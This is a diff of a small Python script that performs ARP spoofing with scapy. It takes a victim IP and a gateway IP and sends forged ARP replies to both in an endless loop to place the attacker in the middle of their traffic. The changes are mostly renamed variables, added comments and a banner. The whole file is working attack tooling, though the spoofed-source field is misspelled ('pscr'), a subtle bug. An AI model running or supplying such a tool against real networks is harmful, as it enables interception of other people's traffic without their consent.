@@ -1,12 +1,16 @@
+# Start Imports.
 import scapy.all as scapy
-import time
-import sys
+import time , sys
 
-print("\t\t\t\t\t[+] << ARP-SP00F (MITM) >> [+]")
+def Banner():
+	# One Line Banner
+	Ban = "\t\t\t\t\t[+] << ARP-SP00F (MITM) >> [+]"
+	print(Ban)
 
-target_ip = input("\nTarget IP >> ")
-network_ip = input("Network IP >> ")
-send_packets = 0
+Banner()
+Address = input("\nTarget IP >> ")
+MainIP = input("Network IP >> ")
+Packets = 0
 
 def MAC_SCAN(ip):
 	arp = scapy.ARP(pdst=ip)
@@ -16,9 +20,9 @@ def MAC_SCAN(ip):
 	return answerd[0][1].hwsrc
 
 def SPOOF(target,network):
-	target_MAC = MAC_SCAN(target)
-	packet = scapy.ARP(op=2,pdst=target,hwdst=target_MAC,pscr=network)
-	scapy.send(packet,verbose=False)
+	target_MAC = MAC_SCAN(target) # Get The Victim MAC Address
+	packet = scapy.ARP(op=2,pdst=target,hwdst=target_MAC,pscr=network) # Create The Packet To Send TO The Victim/Router.
+	scapy.send(packet,verbose=False) # Send The Package Using Scapy
 
 def restore(dist_ip,real_ip):
 	dist_MAC = MAC_SCAN(dist_ip)
@@ -28,19 +32,19 @@ def restore(dist_ip,real_ip):
 
 try:
 	while True:
-		SPOOF(target_ip,network_ip)
-		SPOOF(network_ip,target_ip)
-		send_packets = send_packets + 2
-		print("\r[+] Successful Send " + str(send_packets) + " Packets", end="")
-		sys.stdout.flush()
-		time.sleep(3)
+		SPOOF(Address,MainIP) #--\ Send A Request To Address Once
+		SPOOF(MainIP,Address) #--/ Then Send Another Request To The Router.
+		Packets += 2 # Add 2 To The Total Number Of Packets After Sent The Requests
+		print("\r[+] Successful Send {0} Packets".format(str(Packets)), end="") # Print The Number Of Sent Packets
+		sys.stdout.flush() # Keep The Print AT Same Line
+		time.sleep(2.4) # Wait For 2.4 Seconds
 except KeyboardInterrupt:
-	print("\nOK! As You Like.")
+	print("\nCancel.")
 	answer = input("Do you want to restore every thing? (Y)es or (N)o: ")
-	if answer == "Y":
-		restore(target_ip,network_ip)
-	elif answer == "N":
+	if answer.lower() == "y":
+		restore(Address,MainIP)
+	elif answer.lower() == "n":
 		print("Ok!")
 		sys.exit()
-	else:
+	else: # Auto Exit If There Is Wrong Answer.
 		sys.exit()
